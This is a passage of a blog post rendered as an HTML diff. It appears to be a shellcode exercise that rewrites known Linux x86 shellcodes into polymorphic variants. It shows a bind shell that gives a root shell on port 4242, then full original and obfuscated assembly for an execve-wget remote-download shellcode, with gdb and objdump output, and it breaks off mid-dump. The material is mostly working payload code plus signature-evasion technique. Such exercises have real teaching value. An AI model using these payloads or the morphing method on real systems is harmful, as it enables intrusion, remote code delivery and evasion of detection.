+</span><span class='line'>   0xb7fd2002:  xor    esi,esi
+</span><span class='line'>   0xb7fd2004:  cdq
+</span><span class='line'>   0xb7fd2005:  mov    ax,0x167
+</span><span class='line'>   0xb7fd2009:  push   0x2
+</span><span class='line'>   0xb7fd200b:  pop    ebx
+</span><span class='line'>   0xb7fd200c:  push   0x1
+</span><span class='line'>   0xb7fd200e:  pop    ecx
+</span><span class='line'>   0xb7fd200f:  int    0x80
+</span><span class='line'>   0xb7fd2011:  xchg   ebx,eax
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ./shellcode</span>
+</span><span class='line'>Shellcode length: 39
+</span><span class='line'>Second stage length: 82
+</span><span class='line'><span class="nv">$ </span>ss -nlt<span class="p">|</span>grep 4242
+</span><span class='line'>LISTEN     <span class="m">0</span>      <span class="m">0</span>            *:4242                     *:*
+</span><span class='line'><span class="nv">$ </span>nc -v 127.0.0.1 4242
+</span><span class='line'>Connection to 127.0.0.1 <span class="m">4242</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>2. Remote file download (611)</h3>
+
+<p>The objective of <a href="http://shell-storm.org/shellcode/files/shellcode-611.php">this</a> one consists in calling /usr/bin/wget via <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> and fetch the remote <strong>aaaa</strong> resource. It&rsquo;s size is <strong>42 bytes</strong>, meaning that its morphed code must be at the most <strong>63 bytes</strong>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">byte</span> <span class="err">+</span><span class="mi">0xb</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">execve</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">set</span> <span class="no">edx</span> <span class="no">to</span> <span class="no">zero</span><span class="p">,</span> <span class="no">as</span> <span class="no">well</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                <span class="err">;</span> <span class="no">push</span> <span class="no">the</span> <span class="no">terminating</span> <span class="no">nul</span> <span class="no">byte</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x61616161</span>   <span class="err">;</span> <span class="no">aaaa</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">save</span> <span class="no">address</span> <span class="no">of</span> <span class="no">arguments</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                <span class="err">;</span> <span class="no">push</span> <span class="no">the</span> <span class="no">terminating</span> <span class="no">nul</span> <span class="no">byte</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">byte</span> <span class="err">+</span><span class="mi">0x74</span>         <span class="err">;</span> <span class="no">t</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x6567772f</span>   <span class="err">;</span> <span class="err">/</span><span class="no">wge</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x6e69622f</span>   <span class="err">;</span> <span class="err">/</span><span class="no">bin</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x7273752f</span>   <span class="err">;</span> <span class="err">/</span><span class="no">usr</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">filename</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                <span class="err">;</span> <span class="no">push</span> <span class="no">the</span> <span class="no">terminating</span> <span class="no">nul</span> <span class="no">byte</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">ecx</span>                <span class="err">;</span> <span class="no">push</span> <span class="no">the</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">arguments</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">ebx</span>                <span class="err">;</span> <span class="no">push</span> <span class="no">the</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">filename</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">argv</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">cdq</span> <span class="no">instruction</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">inc</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Trying to execute it does, indeed, fetch the remote resource. In the modified shellcode I&rsquo;ve opted to remove the last two instructions, since if the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call fails -1 is returned, thus incrementing eax would make the code call <a href="http://man7.org/linux/man-pages/man2/restart_syscall.2.html">restart_syscall(2)</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./611
+</span><span class='line'>--2018-08-08 22:00:10--  http://aaaa/
+</span><span class='line'>Resolving aaaa <span class="o">(</span>aaaa<span class="o">)</span>... failed: Name or service not known.
+</span><span class='line'>wget: unable to resolve host address <span class="s1">&#39;aaaa&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To save space, pointer arithmeric operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xffffffff</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">neg</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xa</span>                     <span class="err">;</span> <span class="no">make</span> <span class="no">it</span> <span class="mi">0xb</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">execve</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">cdq</span>                             <span class="err">;</span> <span class="no">make</span> <span class="no">edx</span> <span class="no">zero</span><span class="p">,</span> <span class="no">as</span> <span class="no">well</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">make</span> <span class="no">the</span> <span class="no">base</span> <span class="no">pointer</span> <span class="no">the</span> <span class="no">same</span> <span class="no">as</span> <span class="no">the</span> <span class="no">current</span> <span class="no">stack</span> <span class="no">pointer</span><span class="p">,</span> <span class="no">since</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">operations</span> <span class="no">with</span> <span class="no">pointers</span> <span class="no">are</span> <span class="no">one</span> <span class="no">byte</span> <span class="no">smaller</span> <span class="no">with</span> <span class="no">the</span> <span class="no">former</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                        <span class="err">;</span> <span class="no">nul</span> <span class="no">character</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x61616161</span>                 <span class="err">;</span> <span class="no">fetch</span> <span class="no">this</span> <span class="no">resource</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                        <span class="err">;</span> <span class="no">nul</span> <span class="no">character</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                        <span class="err">;</span> <span class="no">the</span> <span class="no">stack</span> <span class="no">might</span> <span class="no">be</span> <span class="no">full</span> <span class="no">of</span> <span class="no">garbage</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">byte</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x74</span>     <span class="err">;</span> <span class="no">overwrite</span> <span class="no">LSB</span> <span class="no">with</span> <span class="no">a</span> <span class="no">t</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">no</span> <span class="no">need</span> <span class="no">to</span> <span class="no">sub</span> <span class="no">the</span> <span class="no">stack</span> <span class="no">pointer</span> <span class="no">here</span><span class="p">,</span> <span class="no">only</span> <span class="no">the</span> <span class="no">current</span> <span class="no">double</span> <span class="no">word</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">LSB</span> <span class="no">was</span> <span class="no">changed</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xcaceee5e</span>
+</span><span class='line'>  <span class="nf">ror</span> <span class="no">dword</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x1</span>            <span class="err">;</span> <span class="err">/</span><span class="no">wge</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xdcd2c45e</span>
+</span><span class='line'>  <span class="nf">ror</span> <span class="no">dword</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x1</span>            <span class="err">;</span> <span class="err">/</span><span class="no">bin</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xe4e6ea5e</span>
+</span><span class='line'>  <span class="nf">ror</span> <span class="no">dword</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x1</span>            <span class="err">;</span> <span class="err">/</span><span class="no">usr</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">esp</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ebx</span>                         <span class="err">;</span> <span class="no">filename</span>
+</span><span class='line'>  <span class="nf">lea</span> <span class="no">ecx</span><span class="p">,</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x8</span><span class="err">]</span>            <span class="err">;</span> <span class="no">save</span> <span class="no">a</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">the</span> <span class="no">arguments</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x24</span><span class="err">]</span><span class="p">,</span> <span class="no">ecx</span>     <span class="err">;</span> <span class="no">save</span> <span class="no">the</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">the</span> <span class="no">arguments</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">dword</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x28</span><span class="err">]</span><span class="p">,</span> <span class="no">ebx</span>     <span class="err">;</span> <span class="no">save</span> <span class="no">the</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">the</span> <span class="no">command</span>
+</span><span class='line'>  <span class="nf">lea</span> <span class="no">ecx</span><span class="p">,</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x28</span><span class="err">]</span>           <span class="err">;</span> <span class="no">argv</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">by</span> <span class="no">the</span> <span class="no">above</span> <span class="no">cdq</span> <span class="no">instruction</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The stack and registers before the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call will have the following layout and values, as it can be seen from the gdb output:</p>
+
+<pre><code>+------------+
+|   random   | &lt;==== ebp
++------------+
+| 0x00000000 | &lt;==== ebp - 0x04
++------------+
+| 0x61616161 | &lt;==== ebp - 0x08 (ecx)
++------------+
+| 0x00000000 | &lt;==== ebp - 0x0c
++------------+
+| 0x00000074 | &lt;==== ebp - 0x10
++------------+
+| 0x6567772f | &lt;==== ebp - 0x14
++------------+
+| 0x6e69622f | &lt;==== ebp - 0x18
++------------+
+| 0x7273752f | &lt;==== ebp - 0x1c (ebx)
++------------+
+| 0x00000000 | &lt;==== ebp - 0x20
++------------+
+|  ecx  ptr  | &lt;==== ebp - 0x24
++------------+
+|  ebx  ptr  | &lt;==== ebp - 0x28 (ecx)
++------------+
+</code></pre>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">b</span> <span class="p">*</span><span class="mi">0x0040207d</span>
+</span><span class='line'><span class="nf">Breakpoint</span> <span class="mi">2</span> <span class="no">at</span> <span class="mi">0x40207d</span>
+</span><span class='line'><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">continue</span>
+</span><span class='line'><span class="nf">Continuing.</span>
+</span><span class='line'><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">shellcode</span><span class="p">:</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402040</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">push</span>   <span class="mi">0xffffffff</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402042</span> <span class="err">&lt;+</span><span class="mi">2</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">pop</span>    <span class="no">eax</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402043</span> <span class="err">&lt;+</span><span class="mi">3</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">neg</span>    <span class="no">eax</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402045</span> <span class="err">&lt;+</span><span class="mi">5</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">add</span>    <span class="no">al</span><span class="p">,</span><span class="mi">0xa</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402047</span> <span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">cdq</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402048</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">ebp</span><span class="p">,</span><span class="no">esp</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040204a</span> <span class="err">&lt;+</span><span class="mi">10</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">edx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040204b</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="mi">0x61616161</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402050</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">edx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402051</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">edx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402052</span> <span class="err">&lt;+</span><span class="mi">18</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">ebp-0x10</span><span class="err">]</span><span class="p">,</span><span class="mi">0x74</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402056</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="mi">0xcaceee5e</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040205b</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ror</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040205e</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="mi">0xdcd2c45e</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402063</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ror</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402066</span> <span class="err">&lt;+</span><span class="mi">38</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="mi">0xe4e6ea5e</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040206b</span> <span class="err">&lt;+</span><span class="mi">43</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ror</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040206e</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">esp</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040206f</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">ebx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402070</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">ecx</span><span class="p">,</span><span class="err">[</span><span class="no">ebp-0x8</span><span class="err">]</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402073</span> <span class="err">&lt;+</span><span class="mi">51</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">edx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402074</span> <span class="err">&lt;+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">ebp-0x24</span><span class="err">]</span><span class="p">,</span><span class="no">ecx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x00402077</span> <span class="err">&lt;+</span><span class="mi">55</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">ebp-0x28</span><span class="err">]</span><span class="p">,</span><span class="no">ebx</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040207a</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">ecx</span><span class="p">,</span><span class="err">[</span><span class="no">ebp-0x28</span><span class="err">]</span>
+</span><span class='line'><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x0040207d</span> <span class="err">&lt;+</span><span class="mi">61</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">int</span>    <span class="mi">0x80</span>
+</span><span class='line'>   <span class="err">0</span><span class="nf">x0040207f</span> <span class="err">&lt;+</span><span class="mi">63</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="err">[</span><span class="no">eax</span><span class="err">]</span><span class="p">,</span><span class="no">al</span>
+</span><span class='line'><span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
+</span><span class='line'><span class="nf">$50</span> <span class="err">=</span> <span class="err">[</span> <span class="no">IF</span> <span class="no">OF</span> <span class="err">]</span>
+</span><span class='line'><span class="err">0</span><span class="nf">x0040207d</span> <span class="no">in</span> <span class="no">shellcode</span> <span class="p">()</span>
+</span><span class='line'><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">w</span> <span class="no">$esp</span> <span class="p">-</span> <span class="mi">8</span>
+</span><span class='line'><span class="err">0</span><span class="nl">xbffff624:</span>     <span class="err">0</span><span class="nf">xbffff630</span>      <span class="mi">0xbffff644</span>      <span class="mi">0x00000000</span>      <span class="mi">0x7273752f</span>
+</span><span class='line'><span class="err">0</span><span class="nl">xbffff634:</span>     <span class="err">0</span><span class="nf">x6e69622f</span>      <span class="mi">0x6567772f</span>      <span class="mi">0x00000074</span>      <span class="mi">0x00000000</span>
+</span><span class='line'><span class="err">0</span><span class="nl">xbffff644:</span>     <span class="err">0</span><span class="nf">x61616161</span>      <span class="mi">0x00000000</span>
+</span><span class='line'><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="mi">0xbffff630</span>
+</span><span class='line'><span class="err">0</span><span class="nl">xbffff630:</span>     <span class="err">&quot;/</span><span class="nf">usr</span><span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">wget</span><span class="err">&quot;</span>
+</span><span class='line'><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="mi">0xbffff644</span>
+</span><span class='line'><span class="err">0</span><span class="nl">xbffff644:</span>     <span class="err">&quot;</span><span class="nf">aaaa</span><span class="err">&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make <span class="nv">PROG</span><span class="o">=</span>611
+</span><span class='line'>nasm  -f elf32 -o 611.o 611.asm
+</span><span class='line'>ld -N -zexecstack -o <span class="m">611</span> 611.o
+</span><span class='line'><span class="m">08048080</span> &lt;_start&gt;:
+</span><span class='line'> 8048080:       6a ff                   push   0xffffffff
+</span><span class='line'> 8048082:       <span class="m">58</span>                      pop    eax
+</span><span class='line'> 8048083:       f7 d8                   neg    eax
+</span><span class='line'> 8048085:       <span class="m">04</span> 0a                   add    al,0xa
+</span><span class='line'> 8048087:       <span class="m">99</span>                      cdq
+</span><span class='line'> 8048088:       <span class="m">89</span> e5                   mov    ebp,esp
+</span><span class='line'> 804808a:       <span class="m">52</span>                      push   edx
+</span><span class='line'> 804808b:       <span class="m">68</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span> <span class="m">61</span>          push   0x61616161
+</span><span class='line'> 8048090:       <span class="m">52</span>                      push   edx
+</span><span class='line'> 8048091:       <span class="m">52</span>                      push   edx
+</span><span class='line'> 8048092:       c6 <span class="m">45</span> f0 <span class="m">74</span>             mov    BYTE PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,0x74
+</span><span class='line'> 8048096:       <span class="m">68</span> 5e ee ce ca          push   0xcaceee5e
